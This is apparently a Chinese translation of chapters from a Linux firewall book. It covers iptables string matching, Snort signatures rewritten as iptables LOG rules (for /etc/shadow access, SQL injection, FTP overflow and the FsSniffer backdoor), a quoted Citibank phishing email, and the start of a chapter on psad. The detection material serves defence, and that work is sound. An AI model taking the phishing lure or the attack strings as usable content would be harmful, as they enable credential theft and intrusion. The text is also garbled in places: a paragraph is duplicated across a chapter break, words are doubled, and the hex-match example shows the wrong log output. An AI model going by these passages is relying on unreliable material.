然而，UDP 栈会利用 `ICMP` 作为一种原始的响应机制：如果 UDP 数据包被发送到一个没有 UDP 服务器在监听的端口（且该数据包没有先被防火墙拦截），则通常会返回一个 `ICMP` 端口不可达（Port Unreachable）消息。例如，如果我们通过 `iptables` 防火墙允许 UDP 数据包通过 `5001` 端口，但没有在该端口上绑定 UDP 服务器，我们将看到返回给 UDP 客户端的 `ICMP` 端口不可达消息，如下文加粗部分所示：

```
 [iptablesfw]# iptables -I INPUT 1 -p udp --dport 5001 -j ACCEPT
[ext_scanner]$ echo -n "aaaa" | nc -u 71.157.X.X 5001
[iptablesfw]# tcpdump -i eth0 -l -nn port 5001
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 96 bytes
15:12:30.119336 IP 144.202.X.X.40503 > 71.157.X.X.5001: UDP, length 4
15:12:30.119360 IP 71.157.X.X > 144.202.X.X: ICMP 71.157.X.X
udp port 5001
unreachable, length 40
```

入侵检测系统和防火墙也可以针对 UDP 流量生成 `ICMP` 端口不可达消息作为响应。`iptables` 的 `REJECT` 目标通过 `--reject-with icmp-port-unreachable` 命令行参数支持这种响应。例如，以下规则在接收端口 `5001` 的 UDP 数据包时会发送 `ICMP` 端口不可达消息，并且（与所有由 `iptables` 生成的数据包一样），该 `ICMP` 端口不可达消息是在 UDP 栈有机会看到它之前在内核内部制造的。只要防火墙上部署了此规则，无论端口 `5001` 是否绑定了 UDP 服务器都变得重要。为了证明这一点，我们将在从客户端发送 UDP 数据包之前，在防火墙❶ 处启动一个监听端口 `5001` 的 UDP 服务器，并在 ❷ 处展示即使服务器绑定了端口，仍然发送了 `ICMP` 消息：

```
 [iptablesfw]# iptables -I INPUT 1 -p udp --dport 5001 -j REJECT --reject-with
icmp-port-unreachable
[iptablesfw]# ❶nc -l -u -p 5001 &
[1] 12001
[ext_scanner]$ echo -n "aaaa" | nc -u 71.157.X.X 5001
[iptablesfw]# tcpdump -i eth0 -l -nn port 5001
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 96 bytes
15:28:55.949157 IP 144.202.X.X.31726 > 71.157.X.X.5001: UDP, length 4
15:28:55.949264 IP 71.157.X.X > 144.202.X.X: ❷ICMP 71.157.X.X udp
port 5001
unreachable, length 40
```

## 防火墙规则与路由器 ACL

传输层响应（例如通过 `RST` 断开可疑的 TCP 连接，或在 UDP 流量中检测到攻击后发送 `ICMP` 端口不可达消息）在某些情况下是有用的。然而，这些响应仅适用于单个 TCP 连接或 UDP 数据包；并没有持久的阻塞机制可以防止攻击者尝试新的攻击。

幸运的是，发送 `TCP RST` 或 `ICMP` 端口不可达消息还可以与防火墙策略或路由器 ACL 中针对攻击者 IP 地址和受攻击服务的动态创建的阻塞规则相结合（因此，同时使用网络层和传输层标准作为阻塞规则的一部分）。例如，如果检测到来自 IP 地址 `144.202.*X.*XX` 对 Web 服务器的攻击，以下 `iptables` 规则将限制该 IP 地址通过 `FORWARD` 链与 Web 服务器通信的能力：

```
 [iptablesfw]# iptables -I FORWARD 1 -s 144.202.X.X -p tcp --dport 80 -j DROP
```

然而，一旦针对攻击者实例化了阻塞规则，该规则应该由单独的代码管理，该代码可以在配置的一段时间后移除该规则。第 10 章和第 11 章详细详细讨论了 `iptables` 响应选项和配置。

***

^([26]) ⁶ 部署 SYN cookies

# 第 4 章 应用程序攻击与防御

传输层响应（例如通过 `RST` 断开可疑的 TCP 连接，或在 UDP 流量中检测到攻击后发送 `ICMP` 端口不可达消息）在某些情况下是有用的。然而，这些响应仅适用于单个 TCP 连接或 UDP 数据包；并没有持久的阻塞机制可以防止攻击者尝试新的攻击。

幸运的是，发送 `TCP RST` 或 `ICMP` 端口不可达消息还可以与防火墙策略或路由器 ACL 中针对攻击者 IP 地址和受攻击服务的动态创建的阻塞规则相结合（因此，同时使用网络层和传输层标准作为阻塞规则的一部分）。例如，如果检测到来自 IP 地址 `144.202.*X.*XX` 对 Web 服务器的攻击，以下 `iptables` 规则将限制该 IP 地址通过 `FORWARD` 链与 Web 服务器通信的能力。

应用程序层——OSI 模型中的第七层——是底层层所构建的基础。互联网的爆炸式增长是由底层层实现的，但运行在其之上的应用程序才是点燃的燃料。在这个过程中，如果在应用程序生命周期的所有阶段（设计、部署和维护）都优先考虑安全性，我们都会都会受益。

## 使用 iptables 进行应用程序字符串匹配

任何入侵检测系统（IDS）最重要的功能之一就是搜索应用程序层数据中的恶意序列。然而，由于应用程序的结构通常没有网络层或传输层那么严格，入侵检测系统在检查应用程序时必须灵活。

例如，在检查应用程序通信时，如果 IDS 假设某些字节序列是可以忽略的，那么应用程序的变化可能会导致这种假设失效，从而漏掉攻击。

因此，我们需要一种灵活的机制来检查应用程序数据。针对网络流量中的整个应用程序负载进行字符串匹配是一个良好的开始，它由 `iptables` 扩展提供。

### 注意

这就是我在“内核配置”中强调字符串匹配支持的原因。字符串匹配将在第 9 章、第 10 章](#ch10.html "第 10 章 部署 FWSNORT")和第 11 章讨论 fwsnort 时被利用。

`iptables` 字符串匹配扩展允许使用快速 Boyer-Moore 字符串搜索算法搜索数据包负载数据（参见 [`www.cs.utexas.edu/users/moore/best-ideas/string-searching`](http://www.cs.utexas.edu/users/moore/best-ideas/string-searching)）。该算法常用于入侵检测系统，包括领先的开源 IDS Snort ([`www.snort.org`](http://www.snort.org))，因为它能够匹配负载数据中的字符串。

### 注意

字符串匹配自 2.4 内核以来一直存在于 `iptables` 中，但关于内核内存中数据数据结构存储方式的架构更改（`sk_buff`* 结构允许跨越非连续内存）破坏了 2.6.0 到 2.6.13.5 版本的字符串匹配功能。字符串匹配扩展在 2.6.14 内核中进行了重写，并从那时一直包含在内核中。



为了测试 `iptables` 字符串匹配功能，我们构建了一个简单的 `iptables` 规则，该使用字符串匹配扩展来验证其功能是否如描述所言。以下规则使用 `iptables` 的 `LOG` 目标，当字符串 `"tester"` 发送到监听在 TCP 端口 `5001` 的 Netcat 服务器时，生成一条 syslog 信息。（我们需要 `ACCEPT` 规则，以便来自第 1 章 的默认 `iptables` 策略允许从外部源建立 TCP 连接。）

```
 [iptablesfw]# iptables -I INPUT 1 -p tcp --dport 5001 -m string --string "tester" ❶
--algo bm -m state --state ESTABLISHED -j LOG --log-prefix "tester"
[iptablesfw]# iptables -I INPUT 2 -p tcp --dport 5001 -j ACCEPT
```

注意上方 ❶ 处 `iptables` 的命令行参数 `--algo bm`。字符串匹配扩展构建在 Linux 内核的文本搜索基础之上（位于内核源码中的 `linux/lib` 目录）。它支持多种不同的算法，包括 `Boyer-Moore 字符串搜索算法`（上述 `bm`）和 `Knuth-Morris-Pratt 字符串搜索算法`（`kmp`）。^

❷ 处的命令行参数 `-m state --state ESTABLISHED` 将字符串匹配操作限制为属于已建立 TCP 连接部分的数据包，这意味着某些无法导致 `iptables` 规则匹配到来自任意源地址的伪造数据包——必须建立一个双向连接。

我们将使用 Netcat 启动一个在本地 TCP 端口 `5001` 上监听的 TCP 服务器，然后从 `ext_scanner` 系统作为客户端再次使用它向服务器发送字符串 `"tester"`：

```
 [iptablesfw]$ nc -l -p 5001
[ext_scanner]$ echo "tester" | nc 71.157.X.X 5001
```

现在，我们将检查系统日志文件，以寻找字符串匹配规则已生成相应 syslog 信息的证据：

```
 [iptablesfw]# tail /var/log/messages | grep tester
Jul 11 04:19:14 iptablesfw kernel: tester IN=eth0 OUT= MAC=00:13:d3:38:b6:e4:00:30:
48:80:4e:37:08:00 SRC=144.202.X.X DST=71.157.X.X LEN=59 TOS=0x00 PREC=0x00
TTL=64 ID=41843 DF PROTO=TCP SPT=55363 DPT=5001 WINDOW=92 RES=0x00 ACK PSH URGP=0
```

注意上方加粗的日志前缀 `tester`。通过检查日志信息的其余部分，我们可以确认相关数据包是从 `ext_scanner` 系统发送到我们监听 TCP 端口 `5001` 的 Netcat 服务器的。

### Note

我们也可以使用 `telnet`（以行模式运行）作为客户端而不是 Netcat 来实现上述结果，这样整个字符串 `"tester"` 就包含在一个数据包中。这种方法足够有效，但 `telnet` 有一些严重的局限性：它无法与 UDP 服务器交互，而且很难使用 `telnet` 生成任意的不可打印字符。

## 匹配不可打印的应用层数据

当作为客户端运行时，Netcat 可以像与监听 TCP 套字的字交互一样容易地与 UDP 服务器交互。结合一点 Perl，Netcat 可以在网络上传输任意字节，包括无法表示为可打印 ASCII 字符的字节。这一功能非常重要，因为许多漏洞利用了无法用可打印 ASCII 字符表示的不可打印字节；为了模拟此类漏洞在网络上传输的过程，我们需要从客户端生成相同字节的能力。

例如，假设你需要向监听在端口 `5002` 的 UDP 服务器发送一个 10 个字符的字符串，这些字符代表日元，并且你希望 `iptables` 匹配这些字符。根据 ISO 8859-9 字符集（在命令行提示符输入 `man iso_8859-9`），十六代码 `A7` 代表日元符号，因此下面的命令将起作用。

我们首先执行 `iptables` 并带有 `--hex-string` 参数，同时在 `|` 字符之间以十六进制指定指定的字节，如下所示：

```
 [iptablesfw]# iptables -I INPUT 1 -p udp --dport 5002 -m string --hex-string "|a7a7a7a
7a7a7a7a7a7a7|" --algo bm -j LOG --log-prefix "YEN "
```

接下来，我们在端口 `5002` 上启动一个 UDP 服务器。^ 最后，我们使用 Perl 命令生成一系列 10 个十六进制 `A7` 字节，并将该输出通过 Netcat 管道发送到网络上的 UDP 服务器：

```
 [iptablesfw]$ nc -u -l -p 5002
[ext_scanner]$ perl -e 'print "\xa7"x10' | nc -u 71.157.X.X 5002
```

确实，`iptables` 匹配了这些数据包，无论是否在用户空间启动了服务器，你可以看到加粗的 `YEN`：

``` [iptablesfw]# tail /var/log/messages | grep YEN
Jul 11 04:19:14 iptablesfw kernel: YEN IN=eth0 OUT= MAC=00:13:d3:38:b6:e4:00:30:
48:80:4e:37:08:00 SRC=144.202.X.X DST=71.157.X.X LEN=59 TOS=0x00 PREC=0x00
TTL=64 ID=41843 DF PROTO=TCP SPT=55363 DPT=5001 WINDOW=92 RES=0x00 ACK PSH URGP=0
```

* ¹ Boyer-Moore 字符串搜索算法通常优于 Knuth-Morris-Pratt 算法。BM 的最佳情况性能为 `O(n/m)`，而 KMP 的最佳情况性能为 `O(n)`，其中 *n* 是搜索文本的长度，*m* 是搜索字符串的长度。一些性能图表可见 `http://people.netfilter.org/pablo/textsearch`。

² 技术上来说，我们不需要启动 UDP 服务器，因为数据是在没有建立连接的情况下通过 UDP 的，所以 `iptables` 会看到包含 `YEN` 的数据包。此外，我们不需要为端口 `5002` 添加 `ACCEPT` 规则即可生成日志消息（尽管数据没有进入用户空间的服务器）。如果你想查看 Netcat 在服务器端表示的数据，你需要为 UDP 端口 `5002` 添加 `ACCEPT` 规则。

# 应用层攻击定义

我们将应用层攻击定义为对应用程序、应用程序用户或由应用程序管理的数据尝试破坏，目的并非应用程序所有者或管理员授权。应用层攻击通常不依赖于利用下层技术，尽管这些技术（如 IP 欺骗或 TCP 分段）有时被用于更改应用层攻击的交付方式。

应用层攻击之所以可能发生，是因为程序员在严格的截止日期压力下发布代码，没有足够的时间找出导致安全漏洞的错误。此外，许多程序员没有考虑某些语言结构的影响，这些结构会使应用程序受到攻击。

应用层攻击分为三类：

### 利用编程漏洞

应用程序是一项复杂的工程，不可避免地会出现编程错误。某些情况下，这些错误会导致远程访问的严重漏洞。良好的例子包括源于使用不安全的 C 库函数的缓冲区溢出漏洞、Web 相关的漏洞（例如将未过滤的查询传递给后端数据库的 Web 服务器，可能导致 SQL 注入攻击），以及发布未经过滤的用户内容的网站（可能导致跨站脚本攻击 XSS）。

### 利用信任关系





某些攻击利用的是信任关系，而不是攻击应用程序的编程漏洞。从与应用程序本身的交互来看，此类攻击看起来完全是合法的，但它们针对的是人们对应用程序用途的信任。钓鱼攻击就是一个很好的例子；其目标不是 Web 应用程序或邮件服务器，而是解释钓鱼网站或电子邮件消息的人。

### 资源耗尽

类似于网络层或传输层的 DoS（拒绝服务）攻击，应用程序有时会在海量数据输入下崩溃。此类攻击会导致应用程序对所有人都不可用。

## 滥用应用层

网络应用日益增加的复杂性使得利用应用层漏洞变得更加容易。我们在第 2 章]和第 3 章]中看到过一些滥用网络层和传输层的创意方法，但与今天针对应用程序的一些技术相比，这些技术几乎是平淡无奇的。

虽然网络和传输层协议的实现通常符合 RFC 定义的指南，但并没有没有标准来控制特定的 CGI 应用程序如何通过 Web 服务器处理用户输入，或者一个应用程序是否是用不具备自动边界检查或内存管理的编程语言（如 `C`）编写的。有时，全新的攻击技术会被发现并发布到安全社区——一个很好的例子是 HTTP 跨站 Cookie（Cross-Site Cooking），它涉及跨域 Web Cookie 的处理不当（参见 [`en.wikipedia.org/wiki/cross-site_cooking`](http://en.wikipedia.org/wiki/cross-site_cooking)）。

以下章节介绍了常见的应用层攻击。某些攻击可以使用 `iptables` 字符串匹配扩展检测到，每个示例都包含一个针对特定攻击的 `iptables` 规则。（这绝不是利用应用程序技术的完整列表。）

### Snort 签名

理解应用层攻击的最佳方法之一是浏览 Snort 签名集.^([29])。虽然最近的 Snort 签名不再随 Snort 源码发布，但 Bleeding Snort 项目生成了 Snort 格式的近期攻击的签名（参见 [`www.bleedingsnort.com`](http://www.bleedingsnort.com)）。

### 注意

我们将在第 9 章中详细讨论 Snort 签名，但在这里介绍 Snort 提供的应用层检查能力。将 `iptables` 规则与 Snort 签名关联，是从 `iptables` 获取真正入侵检测能力的关键。

考虑以下 Snort 签名：

```
 alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:"WEB-ATTACKS /etc/shadow
access; content:"/etc/shadow"; flow:to_server,established; nocase; classtype:
web-application-activity; sid:1372; rev:5;)
```

该签名检测字符串 `/etc/shadow`（如上文**加粗**所示）何时从 Web 客户端传输到 Web 服务器。Web 服务器（以及它执行的任何 CGI 脚本）最可能以没有足够读取 `/etc/shadow` 文件权限的用户身份运行，但攻击者在尝试请求该文件之前并不一定知道这一点。Snort 寻找的是读取该文件的*尝试*。

为了在 `FORWARD` 链中通过端口 80 的已建立 TCP 连接看到 `/etc/shadow` 字符串时让 `iptables` 生成日志消息，您可以使用以下规则：

```
 [iptablesfw]# iptables -I FORWARD 1 -p tcp --dport 80 -m state --state ESTABLISHED -m
string --string "/etc/shadow" --algo bm -j LOG --log-prefix "ETC_SHADOW "
```

## 缓冲区溢出利用

*缓冲区溢出利用*是一种利用应用程序源代码中出现的编程错误的攻击，其中缓冲区的大小不足以容纳复制到其中的数据量；因此，当相邻的内存位置被覆盖时，使用了*溢出*一词。对于基于栈的缓冲区溢出，成功的利用会覆盖函数返回地址（位于栈上），使其指向攻击者提供的代码。这反过来允许攻击者从那时起控制进程的执行。另一类缓冲区溢出攻击适用于从堆动态分配的内存区域。

缓冲区溢出漏洞通常通过不当使用某些未实现自动边界检查的库函数引入 `C` 或 `C++` 应用程序。此类函数的示例包括 `strcpy()`、`strcat()`、`sprintf()`、`gets()` 和 `scanf()`，以及对通过 `malloc()` 和 `calloc()` 函数从堆分配的内存区域的管理不当。

### 注意

你将在 Aleph One 广引用论文《Smashing the Stack for Fun and Profit》中找到关于编写缓冲区溢出攻击的精彩描述（参见 [`insecure.org/stf/smashstack.html`](http://insecure.org/stf/smashstack.html)）。Jon Erickson 的《Hacking: The Art of Exploitation》（No Starch Press, 2007）是开发缓冲区溢出利用技术信息的另一个优秀来源。

在基于网络的攻击背景下，没有通用的方法来检测缓冲区溢出尝试。然而，对于通过加密通道传输数据的应用程序，填充缓冲区（例如填充 50 个未加密字符 `A`）的攻击将非常可疑。（加密协议通常不会发送相同的字符。）

如果这种攻击存在并在地下世界共享，那么添加一个 `iptables` 规则来查找这种行为可能是值得的。例如，以下规则将用于 SSL 通信。注意 `A` 字符串：

```
 [iptablesfw]# iptables -I FORWARD 1 -p tcp --dport 443 -m state --state ESTABLISHED -m
string --string "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAA" -j LOG
--log-prefix "SSL OVERFLOW "
```

由于利用代码可以将填充字符 `A` 更改为任何字符，上述规则很容易通过简单的修改绕过。然而，利用代码有时会被自动化蠕虫使用，因此上述策略在某些情况下是有效的。

虽然 Snort 签名集包含许多溢出攻击签名，但这些签名通常以不需要特定填充字节的方式检测攻击。有时，作为命令参数的数据的大小本身指示了溢出攻击。例如，以下是针对 FTP 服务器 `chown` 命令的溢出签名。它查找 FTP 会话中 `chown` 命令之后至少 100 字节的数据。

```
 alert tcp $EXTERNAL_NET any -> $HOME_NET 21 (msg:"FTP SITE CHOWN overflow attempt";
flow:to_server,established; content:"SITE"; nocase; content:"CHOWN"; distance:0;
nocase;
isdataat:100,relative; pcre:"^SITE\s+CHOWN\s[^\n]{100}/smi"; reference:bugtraq,
2120;
reference:cve,2001-0065; classtype:attempted-admin; sid:1562; rev:11;)
```

尽管 `iptables` 可用的正则表达式引擎（如果有，就可以将上述**加粗**的 `pcre` 条件直接在 `iptables` 规则中表示），但我们可以产生该 Snort 签名的良好 `iptables` 近似。例如，下面的 `iptables` 规则搜索 `site` 和 `chown` 字符串，并使用长度匹配搜索至少 140 字节的数据包。（由于长度匹配从网络层头部开始而不是应用层开始，我们为 20 字节的 IP 头和 20 字节的 TCP 头留出了空间。）





```
 [iptablesfw]# iptables -I FORWARD 1 -p tcp --dport 21 -m state --state ESTABLISHED -m
string --string "site" --algo bm -m string --string "chown"  --algo bm -m length
--length 140 -j LOG --log-prefix "CHOWN OVERFLOW "
```

### SQL 注入攻击

SQL 注入攻击利用应用程序中的一种漏洞，即用户输入在包含在数据库查询之前，没有对其进行正确的验证或过滤。聪明的攻击者可以利用 SQL 语言的嵌套能力来构建新的查询，并可能从数据库中修改或提取信息。SQL 注入攻击的常见目标是通过 Web 服务器执行并与后端数据库接口的 CGI 应用程序。

例如，假设一个 CGI 程序通过 CGI 脚本使用 Web 客户端提供的用户名和密码，对数据库中的数据进行用户名和密码检查。如果用户名和密码没有经过妥当过滤，用于执行验证的查询就可能会受到注入攻击。这种攻击可以更改查询，使其不仅检查相等性，还能通过新查询修改数据。攻击者可以使用这种方法为任意用户设置密码；甚至可能是管理员级别的密码。

检测通用的 SQL 注入很难，但某些 Snort 规则对于某些攻击已经接近目标。例如，这里有一个 Bleeding Snort 签名，它可以检测攻击者尝试通过在 ❶ 处提供闭合单引号并在❷ 处提供两个 `-` 字符（每个字符后紧跟 NULL 字节）来截断 SQL 查询的一部分的行为。两个 `-` 字符注释掉了 SQL 查询的剩余部分，这可以用于移除通过其他字段的额外连接对查询可能施加的限制。

```
 alert tcp $EXTERNAL_NET any -> $SQL_SERVERS 1433 (msg: "BLEEDING-EDGE EXPLOIT MS-SQL
SQL Injection closing string plus line comment"; flow: to_server,established; content:
❶ "'|00|"; content:❷"-|00|-|00|"; reference:url,www.nextgenss.
com/papers/more_advanced_
sql_injection.pdf; reference:url,www.securitymap.net/sdm/docs/windows/mssql-checklist.
html;
classtype: attempted-user; sid: 2000488; rev:5; )
```

此 Snort 规则可以相对整洁地转换为 iptables，包括通过 `--hex-string` 命令行参数处理 NULL 字符：

```
 [iptablesfw]# iptables -I FORWARD 1 -p tcp --dport 1433 -m state --state ESTABLISHED
-m string --hex-string "'|00|" --algo bm -m string --hex-string  "-|00|-|00|" --algo
bm
-j LOG --log-prefix "SQL INJECTION COMMENT "
```

上述 SQL Snort 签名及其 iptables 等效规则中的一个棘手之处在于，Snort 或 iptables 都不遵守两个内容字符串的顺序。如果属于已建立 TCP 连接的数据包以反向顺序包含这两个字符串（用 Snort 的十六进制表示法表示 NULL 字节），例如，是 `-|00|-|00| foo bar '|00|` 而不是 `'|00| foo bar -|00|-|00|`，那么 Snort 签名和 iptables 规则都会被触发。对于某些签名，如果合法数据有可能会模拟恶意数据但顺序反向，这可能会增加误报率。

### 注意事项

Snort 规则中的 Web 参考 `http://www.nextgenss.com/papers/more_advanced_sql_injection.pdf` 包含了关于 SQL 注入攻击的极佳信息。

## 灰色大脑攻击（Gray Matter Hacking）

如今互联网上一些问题严重的攻击是那些通过用户使用的应用程序直接针对个人的。这些攻击通过利用人们信任某些信息的倾向，绕过了最好的加密算法和身份验证方案。例如，如果攻击者让某人信任某些恶意软件源，或者虚假的密码或密钥，攻击者就可以绕过最复杂的安全机制。有时，利用用户比在加固的系统、应用程序或加密方案中寻找漏洞要容易得多。

### 钓鱼攻击

钓鱼攻击是一种攻击手段，用户被骗向不可信的源提供在线账户（如银行账户）的身份验证凭据。这通常通过向用户发送一封看起来官方的电子邮件来实现，要求他们访问在线账户并出于安全考虑执行某些“紧急”任务，例如更改密码。（如果成功的钓鱼攻击对用户产生破坏性影响，这里的讽刺几乎几乎是幽默的。）邮件提供了一个看起来合法的 Web 链接，但经过精心设计，将用户指向一个由攻击者控制的、模仿真实网站的网站。一旦钓鱼用户访问该网站并输入凭据，攻击者就会窃取他们的账户凭据。

例如，这里是我收到来自伪造邮件地址 `support@citibank.com` 的部分钓鱼邮件内容，主题为 `Citibank Online Security Message`：

```
 当登录 Citibank Online 时，您或其他人已经进行了多次登录
尝试并达到了您的每日尝试限制。作为额外的安全措施，您
访问在线银行的权限已受到限制。此 Web 安全措施不会影响您访问电话银行或 ATM 银行。请在验证您的信息 <a
href="http://196.41.X.X/sys/" onMouseMove="window.status=
'https://www.citibank.com/us/cards/
index.jsp';return true;" onMouseout="window.status=''">这里</a></a>， 在再次尝试
登录
之前。您在验证您的信息后二十四小时内可以尝试登录 Citibank Online。（您现在
不需要更改密码。）
```

 这种看似无害的措辞伪装出一种友好且乐于助人的态度（“多次登录尝试”以及“您不需要更改密码……”），并且 Web 链接经过了精心设计。链接包含了一些嵌入的 JavaScript，当用户将鼠标指针悬停在邮件中的链接文本“这里”上时，指示浏览器显示 Citibank 网站的合法链接。然而，链接的真实目标是 URL `http://196.41.*X.*X*/sys`，这是一个由攻击者控制的 Web 服务器。该 Web 服务器显示的网页与真实网站上的合法页面完全相同。

幸运的是，当以下规则配合 Web 会话时，iptables 可以检测此特定的钓鱼邮件：

```
 [iptablesfw]# iptables -I FORWARD 1 -p tcp --dport 25 -m state --state ESTABLISHED -m
string --string ❶"http://196.41.X.X/sys/" --algo bm -m string --hex-string ❷
"window.status=|27|https://www.citibank.com" -j LOG --log-prefix "CITIBANK PHISH "
```




通过在有效检测和降低误报率之间取得平衡，你可以最大限度地提高新攻击新签名的效能。实现这一点的最佳方法之一是寻找在合法网络通信中不太出现的模式。如果另一种针对新目标的网络钓鱼攻击变得流行，那么可以包含在签名中的良好候选模式包括：与恶意 Web 服务器关联的 IP 地址（尽管这会被攻击者更改）以及任何常见的语言或代码特征（例如中国花银行钓鱼示例中的 `window.status` 字符串）。

### 后门与按键记录

`backdoor`（后门）是一个可执行程序，它包含一个仅对攻击者开放但对合法用户不开放的功能。例如，Sdbot 木马通过自定义的 IRC 客户端连接到攻击者正在其中等待下达命令的 IRC 通道来打开一个后门，但该后门代码的编写方式是：攻击者在采取任何操作之前必须提供有效的密码。这为后门通信增加了一层身份验证，有助于确保只有成功破解系统的攻击者才能控制它。

后门的目标是隐蔽地赋予攻击者在远程机器上执行任何操作的能力，从收集揭示密码的按键记录到远程控制系统。某些后门甚至运行自己的以太网嗅探器，该程序被设计为从 `telnet` 或 `FTP` 等明文协议中提取用户和密码信息（尽管在交换网络中，除非后门安装在作为网关或防火墙的设备上，否则从其他系统嗅探此类信息并不担心）。

FsSniffer 后门此类后门的示例。它通过以下 Snort 规则进行检测：

```
 alert tcp $HOME_NET any -> $EXTERNAL_NET any (msg:"BACKDOOR FsSniffer connection
attempt"; flow:❶to_server,established; content:❷"RemoteNC Control Password|3A|";
reference: nessus,11854; classtype:trojan-activity; sid:2271; rev:2;)
```

在 ❶处，FsSniffer Snort 规则检查属于已建立 TCP 连接且目标为连接服务器端的数据包；在 ❷处，Snort 规则正在寻找应用层内容，这些内容唯一标识攻击者尝试对 FsSniffer 后门的身份验证。

将此 Snort 规则重写为 iptables 空间将产生以下 iptables 规则。（❶ 处的 iptables `ESTABLISHED` 状态匹配要求确保规则匹配属于已建立 TCP 连接的数据包，而 ❷ 处的 `--hex-string` 命令行参数确保了原始内容字段中的十六进制代码 `\x3A` 被正确转译。）

```
 [iptablesfw]# iptables -I FORWARD 1 -p tcp -m state --state ❶ESTABLISHED  -m string
--hex-string ❷"RemoteNC Control Password|3A|" --algo bm  -j LOG  --log-ip-options
--log-tcp-options --log-prefix "FSSNIFFER BACKDOOR "
```

³ Snort 社区将签名称为 `rules`（规则），但入侵检测社区也接受 `signature`（签名）一词作为描述针对入侵检测系统的攻击的机制。在书中，这两个术语是通用的——没有任何限制将签名限制单个简单模式，因此，将复杂的攻击描述称为 `signatures` 同样有效。

⁴ 并非所有的浏览器都以相同的方式处理此问题；我见过 Microsoft IE 显示合法链接，而 Firefox 显示恶意链接（可能是因为我当时使用的 Firefox 版本没有解释以这种方式嵌入链接标签的 JavaScript）。你的情况可能有所不同。

⁵ 更多信息，请参阅 [`www.symantec.com/security_response/writeup.jsp?docid=2002-051312-3628-99&tabid=2`](http://www.symantec.com/security_response/writeup.jsp?docid=2002-051312-3628-99&tabid=2)。

⁶ 额，有人可能会针对任意 TCP 服务器制造 `"RemoteNC Control Password:"` 字符串，而不一定尝试身份验证 FsSniffer 后门，但无论如何，这种活动都是可疑的。

# 加密与应用编码

两个因素使得检测应用层攻击变得困难：加密和应用编码方案。加密特别有问题，因为它旨在使没有加密密钥的解密在计算上是不可行的，且通常 IDS、IPS 和防火墙设备无法访问这些密钥。

然而，某些应用层利用不需要加密就能成功。例如，针对 SSH 服务器的某些攻击存在 Snort 签名（这些签名必然以“明文”运行）。当使用这些签名时，Snort 在无法访问 SSH 加密密钥的情况下查看有效负载数据。这些签名的存在告诉我们，仅靠加密并不是万药，攻击者有时可以利用应用程序中的漏洞，使得通常需要的加密层变得毫无意义。也就是说，漏洞可能存在于非加密手段访问的函数中。

编码技术 IDS 来说也难以处理。例如，许多网络浏览器支持 `gzip` 编码以减小网络传输数据的大小，因为在快速 CPU 上压缩或解压缩数据通常比在慢速网络上传输未压缩的数据要快。如果攻击结合了一些随机数据，然后用 `gzip` 压缩，则 IDS 必须在数据跨网络传输时解压缩产生的数据以检测攻击。随机数据确保了每次压缩后的攻击看起来都是不同的；如果没有这种随机化，IDS 只需要查找压缩字符串本身来识别攻击。在繁忙的网络上，实时解压缩每个网络会话在计算上是不现实的，因为有很多网络会话下载巨大的压缩文件。

### 注意

并非所有的应用层编码对 IDS 来说都是昂贵的。例如，网络会话中的 URL 编码数据由 Snort HTTP 处理器通过其 `uricontent` 关键字实时解码。这是可能的，因为 URL 编码是通过十六进制代码和百分号的简单替换操作完成的——例如，`A` 变成 `%41` 并以相同的方式反转。这种编码方案并不消耗计算。

⁷ 有某些 IDS 产品提供 SSL 密钥托管服务，以便解开加密数据后可以对 Web 服务器通信进行检查。

## 应用层响应

从技术上，对应用层攻击的纯应用层响应应该只涉及应用层存在的结构。例如，如果用户滥用应用程序，应简单禁用他们的账户；或者如果攻击者通过 Web 服务器执行的 CGI 尝试 SQL 注入攻击，则应丢弃查询并向客户端返回 HTTP 错误代码。这种响应不需要操作存在应用层以下的数据包头信息。



然而，严格的应用程序层响应对于防火墙和网络入侵防御系统来说是不切行的，因为它们通常没有与应用程序本身紧密集成。此外，如果从 TCP 会话（需要双向通信）的某个特定 IP 地址发现了高度恶意的攻击，那么直接禁止该攻击者 IP 地址的所有后续通信可能更有用。这是一种针对应用层攻击的网络层响应。

在本书中，我们强调针对应用层攻击的网络层和传输层响应，而不是应用程序本身可以执行的响应。这些响应的实现得益于 `iptables` 创建并管理针对攻击者 IP 地址拦截规则（由 `psad` 项目管理）的能力，以及使用 `REJECT` 目标通过 `fwsnort` 终止 TCP 连接。第 10 章 和 第 11 章 详细介绍了此类响应机制。

虽然存在一些与应用程序紧密集成的安全机制（例如用于 Apache Web 服务器的 `ModSecurity` 模块），但防火墙和入侵检测系统无法看到这些机制的操作细节。

# 第 5 章 介绍 PSAD：端口扫描攻击检测器

在本章中，我将介绍端口扫描攻击检测器，简称为 `psad`。我们将在本章涵盖安装、管理和配置问题，并将繁重的 `psad` 操作和自动响应工作留给接下来的两个章节。

## 历史

成为 `psad` 的软件项目始于 1999 年秋季 Bastille Linux 的一部分开始的，当时 Bastille 开发团队决定 Bastille 应该提供一个轻量级的网络入侵检测组件。当时，Peter Watkins 正在开发优秀的防火墙脚本，这些脚本直到今天仍包含在 Bastille 中，因此开发一个基于防火墙日志提供的信息的 IDS 工具是一个自然而然的下一步。此外，在当时，`PortSentry`（参见 [`sourceforge.net/projects/sentrytools`](http://sourceforge.net/projects/sentrytools)）存在一些架构设计问题，导致它不适合与配置为默认丢弃（default-drop）策略的防火墙配合使用。

虽然我们本可以为 `Snort` 开发一个简单的配置工具（参见 [`www.snort.org`](http://www.snort.org)），但 Jay Beale、Peter Watkins 和我决定开发完全全新的东西，使其与 Linux 内核中的防火墙代码紧密耦合。结果是创建了 Bastille 的一部分 Bastille-NIDS，它可以分析 2.2 系列内核中的 `ipchains` 日志以及 2.4 和 2.6 系列内核中的 `iptables` 日志。

2001 年，我将 Bastille-NIDS 项目拆分出来独立运行，以便它可以独立运行而不一定需要安装 Bastille，我将其命名为端口扫描攻击检测器。`psad` 的开发周期非常活跃，平均每三个或四个月发布一个新版本。

关于为什么 `PortSentry` 与严格的防火墙策略不兼容，请查看 [`www.cipherdyne.org/psad/faq.html#diff_portsentry`](http://www.cipherdyne.org/psad/faq.html#diff_portsentry) 获取更多信息。

## 为什么要分析防火墙日志？

